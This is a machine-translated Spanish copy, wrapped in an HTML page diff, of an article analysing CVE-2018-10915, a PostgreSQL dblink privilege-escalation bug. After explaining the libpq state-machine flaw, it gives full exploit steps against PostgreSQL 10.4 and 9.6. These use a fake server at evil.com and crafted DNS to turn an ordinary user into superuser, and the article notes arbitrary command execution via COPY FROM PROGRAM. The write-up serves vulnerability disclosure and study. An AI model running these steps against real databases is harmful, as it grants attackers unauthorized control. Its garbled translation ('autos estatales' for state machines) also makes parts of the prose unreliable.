@@ -1,0 +1,116 @@
+<!doctype html>
+<html class="no-js" lang="en">
+
+<head>
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-134228602-6');
+  </script>
+
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>👨🏾‍⚕️ 👨🏻‍✈️ ⛺️ Escalada de privilegios de PostgreSQL: análisis de CVE-2018-10915 ㊗️ 🤹🏼 🔄</title>
+  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+  <meta name="description" content="No es ningún secreto que los autos estatales están entre nosotros. Están literalmente en todas partes, desde la interfaz de usuario hasta la pila de r...">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="stylesheet" href="../../css/main.css">
+
+  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>
+
+  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
+  <script>
+        var superSpecialObject = {};
+        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
+        superSpecialObject['enable_page_level_a' + 'ds'] = true;
+       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
+  </script>
+</head>
+
+<body>
+  <!--[if lte IE 9]>
+    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
+  <![endif]-->
+  <header class="page-header js-page-header">
+    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
+    <div class="page-header-text">Geekly articles weekly</div>
+  </header>
+  <section class="page js-page"><h1>Escalada de privilegios de PostgreSQL: análisis de CVE-2018-10915</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/440394/"><img alt="KDPV" src="https://habrastorage.org/webt/jx/p4/br/jxp4br2he9tokl9esruwbnx7j78.png"><br><p>  No es ningún secreto que los autos estatales están entre nosotros.  Están literalmente en todas partes, desde la interfaz de usuario hasta la pila de red.  A veces complejo, a veces simple.  A veces relacionado con la seguridad, a veces no muy.  Pero, a menudo, es bastante fascinante estudiar :) Hoy quiero hablar sobre un caso divertido con PostgreSQL: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">CVE-2018-10915</a> , que permitió aumentar los privilegios para el superusuario. </p><a name="habracut"></a><br><h2 id="nebolshoe-intro">  Pequeña introducción </h2><br><p>  Como saben, las bases de datos administradas le dan ritmo al mundo.  No es sorprendente: si tiene una aplicación simple y no exigente, ¿por qué maldecir con la preparación de su propia base?  De hecho, con la mayoría de los proveedores en la nube (o especializados), puede obtener una base de datos MySQL / PostgreSQL / MongoDB / etc. y vivir feliz para siempre.  Por supuesto, esto causó problemas adicionales, ya que  si antes, para explotar la mayoría de los problemas de seguridad en las bases de datos, primero tenía que obtener la aplicación (que en sí misma terminó en la mayoría de los casos), ahora <del>  culo desnudo </del>  su interfaz está para el atacante.  Debería haber una observación sobre el hecho de que la próxima barrera debería ser una infraestructura de alta calidad y esto es cierto, pero hoy no se trata de eso. </p><br><h2 id="sut-cve-2018-10915">  La esencia de CVE-2018-10915 </h2><br><ul><li>  En la mayoría de los casos, PostgreSQL no requiere autenticación para conexiones locales.  Un ejemplo de la imagen oficial de docker: </li></ul><br><pre><code class="plaintext hljs"># pg_hba.conf from PostgreSQL docker image # note: debian pkg marked only "local" connections as trusted # "local" is for Unix domain socket connections only local all all trust # IPv4 local connections: host all all 127.0.0.1/32 trust # IPv6 local connections: host all all ::1/128 trust</code> </pre> <br><ul><li>  Gracias a las <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">extensiones dblink</a> y <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">postgres_fdw</a> , puede conectarse a bases de datos remotas.  Y a juzgar por los foros, a los consumidores a menudo se les pregunta sobre su disponibilidad;) </li><li>  los autores ya fueron quemados en la escalada de privilegios, por lo que hicieron un truco prohibiendo conexiones sin autenticación: </li></ul><br><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">// https://github.com/postgres/postgres/blob/0993b8ada53395a8c8a59401a7b4cfb501f6aaef/contrib/dblink/dblink.c#L2621-L2639 static void dblink_security_check(PGconn *conn, remoteConn *rconn) { if (!superuser()) { if (!PQconnectionUsedPassword(conn)) { PQfinish(conn); if (rconn) pfree(rconn); ereport(ERROR, (errcode(ERRCODE_S_R_E_PROHIBITED_SQL_STATEMENT_ATTEMPTED), errmsg("password is required"), errdetail("Non-superuser cannot connect if the server does not request a password."), errhint("Target server's authentication method must be changed."))); } } } // https://github.com/postgres/postgres/blob/0993b8ada53395a8c8a59401a7b4cfb501f6aaef/src/interfaces/libpq/fe-connect.c#L6305-L6314 int PQconnectionUsedPassword(const PGconn *conn) { if (!conn) return false; if (conn-&gt;password_needed) return true; else return false; }</span></span></code> </pre> <br><ul><li>  la máquina de estado establece el indicador <code>password_needed</code> después de recibir un mensaje <code>AUTH_REQ_MD5</code> o <code>AUTH_REQ_PASSWORD</code> del servidor </li><li>  <code>libpq</code> puede omitir múltiples IP (pg 9.x) o hosts (pg 10.x / 11.x) en busca de un adecuado </li><li>  la máquina de estado pasa a la siguiente IP / host después de configurar el indicador <code>password_needed</code> en dos casos convenientes para nosotros: <br><ul><li>  queremos una sesión de escritura ( <code>target_session_attrs=read-write</code> ), y el servidor es de solo lectura </li><li>  al recibir un error <code>unknown application_name</code> </li></ul></li><li>  al pasar a la siguiente IP / host, se <a href="">llama pqDropConnection</a> , que limpia de forma muy selectiva los datos de conexión (ya que algunos de ellos pueden ser necesarios para la reconexión).  Sugerencia: <code>password_needed</code> no restablecida </li><li>  Esto permite omitir la comprobación dblink_security_check, como  cuando se conecta al siguiente host, la bandera permanece con el valor anterior </li><li>  BENEFICIO </li></ul><br><p>  Por lo tanto, si tenemos <em>algún</em> usuario con acceso a <code>dblink</code> y PostgreSQL con conexiones confiables para este host, podemos omitir el requisito de autenticación con una contraseña, conectarnos en nombre del supervisor de <code>postgres</code> y ejecutar cualquier cosa en su nombre (por ejemplo, comandos arbitrarios que usan <code>COPY foo FROM PROGRAM 'whoami';</code> ). </p><br><h2 id="ot-teorii-k-praktike---postgresql-104">  De la teoría a la práctica: ¡PostgreSQL 10.4! </h2><br><p>  Pero no te cansarás de una sola teoría, así que preparé un pequeño ejemplo de explotación de esta vulnerabilidad.  Comenzaremos con PostgreSQL 10.4. </p><br><ul><li>  Primero, escriba y ejecute un servidor PostgreSQL simple ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">bogus-pgsrv</a> ), que requerirá autenticación de contraseña para cualquier solicitud y enviará un error <code>ERRCODE_APPNAME_UNKNOWN</code> después de recibirlo: </li></ul><br><pre> <code class="plaintext hljs">$ psql "host=evil.com user=test password=test application_name=bar" psql: ERROR: unknown app name could not connect to server: Connection refused Is the server running on host "evil.com" (1.1.1.1) and accepting TCP/IP connections on port 5432?</code> </pre> <br><ul><li>  Ahora prepare la prueba PostgreSQL: </li></ul><br><pre> <code class="plaintext hljs">$ docker run -it -d -p 5432:5432 -e POSTGRES_PASSWORD=somepass postgres:10.4 e5f07b396d51059c3abf53c8f4f78b0b90a9966289e6df03eb4eccaeeb364545 $ psql "host=localhost user=postgres password=somepass" &lt;&lt;'SQL' CREATE USER test WITH PASSWORD 'test'; CREATE DATABASE test; \c test CREATE EXTENSION dblink; SQL</code> </pre> <br><ul><li>  comprobamos que la <code>test</code> usuario no tiene derechos específicos: </li></ul><br><pre> <code class="plaintext hljs">$ psql "host=localhost user=test password=test" &lt;&lt;'SQL' \du SQL List of roles Role name | Attributes | Member of -----------+------------------------------------------------------------+----------- postgres | Superuser, Create role, Create DB, Replication, Bypass RLS | {} test</code> </pre> <br><ul><li>  excelente, ahora operamos: </li></ul><br><pre> <code class="plaintext hljs">$ psql "host=localhost user=test password=test" &lt;&lt;'SQL' select * from dblink_connect('host=evil.com,localhost user=postgres password=foo application_name=bar'); select dblink_exec('ALTER USER test WITH SUPERUSER;'); \du SQL dblink_connect ---------------- OK (1 row) dblink_exec ------------- ALTER ROLE (1 row) List of roles Role name | Attributes | Member of -----------+------------------------------------------------------------+----------- postgres | Superuser, Create role, Create DB, Replication, Bypass RLS | {} test | Superuser</code> </pre> <br><ul><li>  Eso es todo.  Podemos hacer lo que queramos ^ _ ^ </li></ul><br><h2 id="ot-teorii-k-praktike---postgresql-96">  De la teoría a la práctica: ¡PostgreSQL 9.6! </h2><br><p>  Con PostgreSQL 9.x, las cosas son un poco más complicadas, porque  no admite enumerar la lista de hosts a los que conectarse.  Pero si la dirección se resuelve en varias IP, ¡las omitirá a todas!  Y desde  Las direcciones IPv6 tienen prioridad (consulte <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">RFC6724</a> ), podemos hacer lo mismo simplemente respondiendo nuestras IP a una solicitud AAAA y 127.0.0.1 a A + desconectando conexiones durante unos segundos después de enviar <code>ERRCODE_APPNAME_UNKNOWN</code> : </p><br><ul><li>  preparar DNS: </li></ul><br><pre> <code class="plaintext hljs">$ host 2a017e0100000000f03c91fffe3bc9ba.6.127-0-0-1.4.m.evil.com 2a017e0100000000f03c91fffe3bc9ba.6.127-0-0-1.4.m.evil.com has address 127.0.0.1 2a017e0100000000f03c91fffe3bc9ba.6.127-0-0-1.4.m.evil.com has IPv6 address 2a01:7e01::f03c:91ff:fe3b:c9ba</code> </pre> <br><ul><li>  ejecutar el mismo pgsql falso </li><li>  y prepare nuevamente la prueba PostgreSQL (IPv6 debería funcionar para el acoplador, esto es importante): </li></ul><br><pre> <code class="plaintext hljs">$ docker run -it -d -p 5432:5432 -e POSTGRES_PASSWORD=somepass postgres:9.6 dfda35ab80ae9dbd69322d00452b7d829f90874b7c70f03bd4e05afec97d296c $ psql "host=localhost user=postgres password=somepass" &lt;&lt;'SQL' CREATE USER test WITH PASSWORD 'test'; CREATE DATABASE test; \c test CREATE EXTENSION dblink; SQL</code> </pre> <br><ul><li>  nosotros operamos: </li></ul><br><pre> <code class="plaintext hljs">$ psql "host=localhost user=test password=test" &lt;&lt;'SQL' select * from dblink_connect('host=2a017e0100000000f03c91fffe3bc9ba.6.127-0-0-1.4.m.evil.com user=postgres password=foo application_name=bar'); select dblink_exec('ALTER USER test WITH SUPERUSER;'); \du SQL dblink_connect ---------------- OK (1 row) dblink_exec ------------- ALTER ROLE (1 row) List of roles Role name | Attributes | Member of -----------+------------------------------------------------------------+----------- postgres | Superuser, Create role, Create DB, Replication, Bypass RLS | {} test | Superuser | {}</code> </pre><br><ul><li>  Eso es todo.  Podemos hacer lo que queramos ^ _ ^ </li></ul><br><h2 id="zaklyuchenie">  Conclusión </h2><br><p>  Quería concluir escribiendo algo inteligente, pero, desafortunadamente, no tengo una manera buena, simple y universal de verificar que todo esté bien con su máquina de estados.  Hay varios intentos, pero, por lo que vi, están demasiado especializados o todavía se enfrentan a errores lógicos de la misma manera.  Queda por esperar la vigilancia y un par de ojos adicionales en la revisión :( </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/440394/">https://habr.com/ru/post/440394/</a></p>
+<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
+<h4>More articles:</h4>
+<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
+<li><a href="../440382/index.html">¿200 es bueno o malo?</a></li>
+<li><a href="../440386/index.html">Liberando el manejo de errores eliminando errores</a></li>
+<li><a href="../440388/index.html">Intervalos: la próxima evolución de C ++</a></li>
+<li><a href="../440390/index.html">El mundo diverso de los sistemas embebidos y el lugar de Embox en él.</a></li>
+<li><a href="../440392/index.html">WebRTC en su sitio: sin errores ni presupuesto</a></li>
+<li><a href="../440398/index.html">Historia de participación (y victoria) en la Copa AI rusa 2018 - CodeBall</a></li>
+<li><a href="../440400/index.html">Apache Kafka + Spring Boot: Hola, microservicios</a></li>
+<li><a href="../440402/index.html">Desarrollador de SearchFace sobre las características del algoritmo</a></li>
+<li><a href="../440404/index.html">"Arquitectura de la información": mitap en OZON</a></li>
+<li><a href="../440410/index.html">Seleccionar, almacenar en caché y mostrar fotos en el mapa</a></li>
+</ul></nav>
+</section><br />
+<a href="../../allArticles.html"><strong>All Articles</strong></a>
+<script src="../../js/main.js"></script>
+
+<!-- Yandex.Metrika counter -->
+<script type="text/javascript" >
+  (function (d, w, c) {
+      (w[c] = w[c] || []).push(function() {
+          try {
+              w.yaCounter57283870 = new Ya.Metrika({
+                  id:57283870,
+                  clickmap:true,
+                  trackLinks:true,
+                  accurateTrackBounce:true,
+                  webvisor:true
+              });
+          } catch(e) { }
+      });
+
+      var n = d.getElementsByTagName("script")[0],
+          s = d.createElement("script"),
+          f = function () { n.parentNode.insertBefore(s, n); };
+      s.type = "text/javascript";
+      s.async = true;
+      s.src = "https://mc.yandex.ru/metrika/watch.js";
+
+      if (w.opera == "[object Opera]") {
+          d.addEventListener("DOMContentLoaded", f, false);
+      } else { f(); }
+  })(document, window, "yandex_metrika_callbacks");
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+
+<!-- Google Analytics -->
+  <script>
+    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
+    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
+  </script>
+  <script src="https://www.google-analytics.com/analytics.js" async defer></script>
+
+</section>
+
+<footer class="page-footer">
+  <div class="page-footer-legal-info-container page-footer-element">
+    <p>
+      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
+    </p>
+  </div>
+  <div class="page-footer-counters-container page-footer-element">
+    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
+  </div>
+</footer>
+  
+</body>
+
+</html>
